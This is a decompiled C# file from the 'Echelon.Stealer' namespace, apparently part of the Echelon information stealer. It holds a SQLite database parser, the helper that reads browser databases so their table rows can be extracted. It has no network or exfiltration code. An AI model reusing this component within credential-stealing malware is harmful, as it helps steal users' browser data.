using System;
using System.IO;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Echelon.Stealer.Browsers.Helpers
{
	// Token: 0x02000031 RID: 49
	public class CNT
	{
		// Token: 0x060000C1 RID: 193 RVA: 0x0001CA48 File Offset: 0x0001AC48
		public CNT(string baseName)
		{
			this.SQLDataTypeSize = new byte[]
			{
				0,
				1,
				2,
				3,
				4,
				6,
				8,
				8,
				0,
				0
			};
			if (File.Exists(baseName))
			{
				FileSystem.FileOpen(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1);
				string s = Strings.Space((int)FileSystem.LOF(1));
				FileSystem.FileGet(1, ref s, -1L, false);
				FileSystem.FileClose(new int[]
				{
					1
				});
				this.DataArray = Encoding.Default.GetBytes(s);
				this.PageSize = (ushort)this.ToUInt64(16, 2);
				this.DataEncoding = this.ToUInt64(56, 4);
				if (decimal.Compare(new decimal(this.DataEncoding), 0m) == 0)
				{
					this.DataEncoding = 1L;
				}
				this.ReadDataEntries(100UL);
			}
		}

		// Token: 0x17000003 RID: 3
		// (get) Token: 0x060000C2 RID: 194 RVA: 0x00008BFC File Offset: 0x00006DFC
		private byte[] DataArray { get; }

		// Token: 0x17000004 RID: 4
		// (get) Token: 0x060000C3 RID: 195 RVA: 0x00008C04 File Offset: 0x00006E04
		private ulong DataEncoding { get; }

		// Token: 0x17000005 RID: 5
		// (get) Token: 0x060000C4 RID: 196 RVA: 0x00008C0C File Offset: 0x00006E0C
		// (set) Token: 0x060000C5 RID: 197 RVA: 0x00008C14 File Offset: 0x00006E14
		public string[] Fields { get; set; }

		// Token: 0x17000006 RID: 6
		// (get) Token: 0x060000C6 RID: 198 RVA: 0x00008C1D File Offset: 0x00006E1D
		public int RowLength
		{
			get
			{
				return this.SqlRows.Length;
			}
		}

		// Token: 0x17000007 RID: 7
		// (get) Token: 0x060000C7 RID: 199 RVA: 0x00008C27 File Offset: 0x00006E27
		private ushort PageSize { get; }

		// Token: 0x17000008 RID: 8
		// (get) Token: 0x060000C8 RID: 200 RVA: 0x00008C2F File Offset: 0x00006E2F
		// (set) Token: 0x060000C9 RID: 201 RVA: 0x00008C37 File Offset: 0x00006E37
		private FF[] DataEntries { get; set; }

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x060000CA RID: 202 RVA: 0x00008C40 File Offset: 0x00006E40
		// (set) Token: 0x060000CB RID: 203 RVA: 0x00008C48 File Offset: 0x00006E48
		private ROW[] SqlRows { get; set; }

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x060000CC RID: 204 RVA: 0x00008C51 File Offset: 0x00006E51
		private byte[] SQLDataTypeSize { get; }

		// Token: 0x060000CD RID: 205 RVA: 0x0001CB20 File Offset: 0x0001AD20
		public string[] ParseTables()
		{
			string[] array = null;
			int num = 0;
			int num2 = this.DataEntries.Length - 1;
			for (int i = 0; i <= num2; i++)
			{
				if (this.DataEntries[i].Type == "table")
				{
					array = (string[])Utils.CopyArray(array, new string[num + 1]);
					array[num] = this.DataEntries[i].Name;
					num++;
				}
			}
			return array;
		}

		// Token: 0x060000CE RID: 206 RVA: 0x00008C59 File Offset: 0x00006E59
		public string ParseValue(int rowIndex, int fieldIndex)
		{
			if (rowIndex >= this.SqlRows.Length)
			{
				return null;
			}
			if (fieldIndex >= this.SqlRows[rowIndex].RowData.Length)
			{
				return null;
			}
			return this.SqlRows[rowIndex].RowData[fieldIndex];
		}

		// Token: 0x060000CF RID: 207 RVA: 0x0001CB98 File Offset: 0x0001AD98
		public string ParseValue(int rowIndex, string fieldName)
		{
			int num = -1;
			int num2 = this.Fields.Length - 1;
			int i = 0;
			while (i <= num2)
			{
				if (this.Fields[i].ToLower().Trim().CompareTo(fieldName.ToLower().Trim()) != 0)
				{
					i++;
				}
				else
				{
					num = i;
					IL_45:
					if (num == -1)
					{
						return null;
					}
					return this.ParseValue(rowIndex, num);
				}
			}
			goto IL_45;
		}

		// Token: 0x060000D0 RID: 208 RVA: 0x0001CBF8 File Offset: 0x0001ADF8
		public bool ReadTable(string tableName)
		{
			int num = -1;
			int num2 = this.DataEntries.Length - 1;
			int i = 0;
			while (i <= num2)
			{
				if (this.DataEntries[i].Name.ToLower().CompareTo(tableName.ToLower()) != 0)
				{
					i++;
				}
				else
				{
					num = i;
					IL_40:
					if (num == -1)
					{
						return false;
					}
					string[] array = this.DataEntries[num].SqlStatement.Substring(this.DataEntries[num].SqlStatement.IndexOf("(") + 1).Split(new char[]
					{
						','
					});
					int num3 = array.Length - 1;
					for (int j = 0; j <= num3; j++)
					{
						array[j] = array[j].TrimStart(new char[0]);
						int num4 = array[j].IndexOf(" ");
						if (num4 > 0)
						{
							array[j] = array[j].Substring(0, num4);
						}
						if (array[j].IndexOf("UNIQUE") == 0)
						{
							break;
						}
						this.Fields = (string[])Utils.CopyArray(this.Fields, new string[j + 1]);
						this.Fields[j] = array[j];
					}
					return this.ReadDataEntriesFromOffsets((ulong)((this.DataEntries[num].RootNum - 1L) * (long)((ulong)this.PageSize)));
				}
			}
			goto IL_40;
		}

		// Token: 0x060000D1 RID: 209 RVA: 0x0001CD6C File Offset: 0x0001AF6C
		private ulong ToUInt64(int startIndex, int Size)
		{
			if (Size <= 8 && Size != 0)
			{
				ulong num = 0UL;
				for (int i = 0; i <= Size - 1; i++)
				{
					num = (num << 8 | (ulong)this.DataArray[startIndex + i]);
				}
				return num;
			}
			return 0UL;
		}

		// Token: 0x060000D2 RID: 210 RVA: 0x0001CDB4 File Offset: 0x0001AFB4
		private long CalcVertical(int startIndex, int endIndex)
		{
			endIndex++;
			byte[] array = new byte[8];
			int num = endIndex - startIndex;
			bool flag = false;
			if (num == 0 | num > 9)
			{
				return 0L;
			}
			if (num != 1)
			{
				if (num == 9)
				{
					flag = true;
				}
				int num2 = 1;
				int num3 = 7;
				int num4 = 0;
				if (flag)
				{
					array[0] = this.DataArray[endIndex - 1];
					endIndex--;
					num4 = 1;
				}
				for (int i = endIndex - 1; i >= startIndex; i += -1)
				{
					if (i - 1 >= startIndex)
					{
						array[num4] = (byte)(((int)((byte)(this.DataArray[i] >> (num2 - 1 & 7))) & 255 >> num2) | (int)((byte)(this.DataArray[i - 1] << (num3 & 7))));
						num2++;
						num4++;
						num3--;
					}
					else if (!flag)
					{
						array[num4] = (byte)((int)((byte)(this.DataArray[i] >> (num2 - 1 & 7))) & 255 >> num2);
					}
				}
				return BitConverter.ToInt64(array, 0);
			}
			array[0] = (this.DataArray[startIndex] & 127);
			return BitConverter.ToInt64(array, 0);
		}

		// Token: 0x060000D3 RID: 211 RVA: 0x0001CEC4 File Offset: 0x0001B0C4
		private int GetValues(int startIndex)
		{
			if (startIndex > this.DataArray.Length)
			{
				return 0;
			}
			int num = startIndex + 8;
			for (int i = startIndex; i <= num; i++)
			{
				if (i > this.DataArray.Length - 1)
				{
					return 0;
				}
				if ((this.DataArray[i] & 128) != 128)
				{
					return i;
				}
			}
			return startIndex + 8;
		}

		// Token: 0x060000D4 RID: 212 RVA: 0x00008C97 File Offset: 0x00006E97
		public static bool ItIsOdd(long value)
		{
			return (value & 1L) == 1L;
		}

		// Token: 0x060000D5 RID: 213 RVA: 0x0001CF1C File Offset: 0x0001B11C
		private void ReadDataEntries(ulong Offset)
		{
			if (this.DataArray[(int)((uint)Offset)] == 13)
			{
				ushort num = (this.ToUInt64((Offset.ForceTo<decimal>() + 3m).ForceTo<int>(), 2).ForceTo<decimal>() - 1m).ForceTo<ushort>();
				int num2 = 0;
				if (this.DataEntries != null)
				{
					num2 = this.DataEntries.Length;
					this.DataEntries = (FF[])Utils.CopyArray(this.DataEntries, new FF[this.DataEntries.Length + (int)num + 1]);
				}
				else
				{
					this.DataEntries = new FF[(int)(num + 1)];
				}
				int num3 = (int)num;
				for (int i = 0; i <= num3; i++)
				{
					ulong num4 = this.ToUInt64((Offset.ForceTo<decimal>() + 8m + (i * 2).ForceTo<decimal>()).ForceTo<int>(), 2);
					if (decimal.Compare(Offset.ForceTo<decimal>(), 100m) != 0)
					{
						num4 += Offset;
					}
					int num5 = this.GetValues(num4.ForceTo<int>());
					this.CalcVertical(num4.ForceTo<int>(), num5);
					int num6 = this.GetValues((num4.ForceTo<decimal>() + num5.ForceTo<decimal>() - num4.ForceTo<decimal>() + 1m).ForceTo<int>());
					this.DataEntries[num2 + i].ID = this.CalcVertical((num4.ForceTo<decimal>() + num5.ForceTo<decimal>() - num4.ForceTo<decimal>() + 1m).ForceTo<int>(), num6);
					num4 = (num4.ForceTo<decimal>() + num6.ForceTo<decimal>() - num4.ForceTo<decimal>() + 1m).ForceTo<ulong>();
					num5 = this.GetValues(num4.ForceTo<int>());
					num6 = num5;
					long value = this.CalcVertical(num4.ForceTo<int>(), num5);
					long[] array = new long[5];
					int num7 = 0;
					do
					{
						num5 = num6 + 1;
						num6 = this.GetValues(num5);
						array[num7] = this.CalcVertical(num5, num6);
						if (array[num7] > 9L)
						{
							if (CNT.ItIsOdd(array[num7]))
							{
								array[num7] = (long)Math.Round((double)(array[num7] - 13L) / 2.0);
							}
							else
							{
								array[num7] = (long)Math.Round((double)(array[num7] - 12L) / 2.0);
							}
						}
						else
						{
							array[num7] = (long)((ulong)this.SQLDataTypeSize[(int)array[num7]]);
						}
						num7++;
					}
					while (num7 <= 4);
					Encoding encoding = Encoding.Default;
					decimal value2 = this.DataEncoding.ForceTo<decimal>();
					if (!1m.Equals(value2))
					{
						if (!2m.Equals(value2))
						{
							if (3m.Equals(value2))
							{
								encoding = Encoding.BigEndianUnicode;
							}
						}
						else
						{
							encoding = Encoding.Unicode;
						}
					}
					else
					{
						encoding = Encoding.Default;
					}
					this.DataEntries[num2 + i].Type = encoding.GetString(this.DataArray, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
					this.DataEntries[num2 + i].Name = encoding.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
					this.DataEntries[num2 + i].RootNum = (long)this.ToUInt64(Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2]))), (int)array[3]);
					this.DataEntries[num2 + i].SqlStatement = encoding.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
				}
				return;
			}
			if (this.DataArray[(int)((uint)Offset)] != 5)
			{
				return;
			}
			int num8 = (int)Convert.ToUInt16(decimal.Subtract(new decimal(this.ToUInt64(Convert.ToInt32(decimal.Add(new decimal(Offset), 3m)), 2)), 1m));
			for (int j = 0; j <= num8; j++)
			{
				ushort num9 = (ushort)this.ToUInt64(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12m), new decimal(j * 2))), 2);
				if (decimal.Compare(new decimal(Offset), 100m) == 0)
				{
					this.ReadDataEntries(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ToUInt64((int)num9, 4)), 1m), new decimal((int)this.PageSize))));
				}
				else
				{
					this.ReadDataEntries(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ToUInt64((int)(Offset + (ulong)num9), 4)), 1m), new decimal((int)this.PageSize))));
				}
			}
			this.ReadDataEntries(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ToUInt64(Convert.ToInt32(decimal.Add(new decimal(Offset), 8m)), 4)), 1m), new decimal((int)this.PageSize))));
		}

		// Token: 0x060000D6 RID: 214 RVA: 0x0001D550 File Offset: 0x0001B750
		private bool ReadDataEntriesFromOffsets(ulong Offset)
		{
			if (this.DataArray[(int)((uint)Offset)] == 13)
			{
				int num = Convert.ToInt32(decimal.Subtract(new decimal(this.ToUInt64(Convert.ToInt32(decimal.Add(new decimal(Offset), 3m)), 2)), 1m));
				int num2 = 0;
				if (this.SqlRows != null)
				{
					num2 = this.SqlRows.Length;
					this.SqlRows = (ROW[])Utils.CopyArray(this.SqlRows, new ROW[this.SqlRows.Length + num + 1]);
				}
				else
				{
					this.SqlRows = new ROW[num + 1];
				}
				int num3 = num;
				for (int i = 0; i <= num3; i++)
				{
					SZ[] array = null;
					ulong num4 = this.ToUInt64(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8m), new decimal(i * 2))), 2);
					if (decimal.Compare(new decimal(Offset), 100m) != 0)
					{
						num4 += Offset;
					}
					int num5 = this.GetValues((int)num4);
					this.CalcVertical((int)num4, num5);
					int num6 = this.GetValues(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)));
					this.SqlRows[num2 + i].ID = this.CalcVertical(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)), num6);
					num4 = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num6), new decimal(num4))), 1m));
					num5 = this.GetValues((int)num4);
					num6 = num5;
					long num7 = this.CalcVertical((int)num4, num5);
					long num8 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num4), new decimal(num5)), 1m));
					int num9 = 0;
					while (num8 < num7)
					{
						array = (SZ[])Utils.CopyArray(array, new SZ[num9 + 1]);
						num5 = num6 + 1;
						num6 = this.GetValues(num5);
						array[num9].Type = this.CalcVertical(num5, num6);
						if (array[num9].Type > 9L)
						{
							if (CNT.ItIsOdd(array[num9].Type))
							{
								array[num9].Size = (long)Math.Round((double)(array[num9].Type - 13L) / 2.0);
							}
							else
							{
								array[num9].Size = (long)Math.Round((double)(array[num9].Type - 12L) / 2.0);
							}
						}
						else
						{
							array[num9].Size = (long)((ulong)this.SQLDataTypeSize[(int)array[num9].Type]);
						}
						num8 = num8 + (long)(num6 - num5) + 1L;
						num9++;
					}
					this.SqlRows[num2 + i].RowData = new string[array.Length - 1 + 1];
					int num10 = 0;
					int num11 = array.Length - 1;
					for (int j = 0; j <= num11; j++)
					{
						if (array[j].Type > 9L)
						{
							if (!CNT.ItIsOdd(array[j].Type))
							{
								if (decimal.Compare(new decimal(this.DataEncoding), 1m) == 0)
								{
									this.SqlRows[num2 + i].RowData[j] = Encoding.Default.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size);
								}
								else if (decimal.Compare(new decimal(this.DataEncoding), 2m) == 0)
								{
									this.SqlRows[num2 + i].RowData[j] = Encoding.Unicode.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size);
								}
								else if (decimal.Compare(new decimal(this.DataEncoding), 3m) == 0)
								{
									this.SqlRows[num2 + i].RowData[j] = Encoding.BigEndianUnicode.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size);
								}
							}
							else
							{
								this.SqlRows[num2 + i].RowData[j] = Encoding.Default.GetString(this.DataArray, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size);
							}
						}
						else
						{
							this.SqlRows[num2 + i].RowData[j] = Convert.ToString(this.ToUInt64(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].Size));
						}
						num10 += (int)array[j].Size;
					}
				}
			}
			else if (this.DataArray[(int)((uint)Offset)] == 5)
			{
				int num12 = (int)Convert.ToUInt16(decimal.Subtract(new decimal(this.ToUInt64(Convert.ToInt32(decimal.Add(new decimal(Offset), 3m)), 2)), 1m));
				for (int k = 0; k <= num12; k++)
				{
					ushort num13 = (ushort)this.ToUInt64(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12m), new decimal(k * 2))), 2);
					this.ReadDataEntriesFromOffsets(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ToUInt64((int)(Offset + (ulong)num13), 4)), 1m), new decimal((int)this.PageSize))));
				}
				this.ReadDataEntriesFromOffsets(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ToUInt64(Convert.ToInt32(decimal.Add(new decimal(Offset), 8m)), 4)), 1m), new decimal((int)this.PageSize))));
			}
			return true;
		}
	}
}
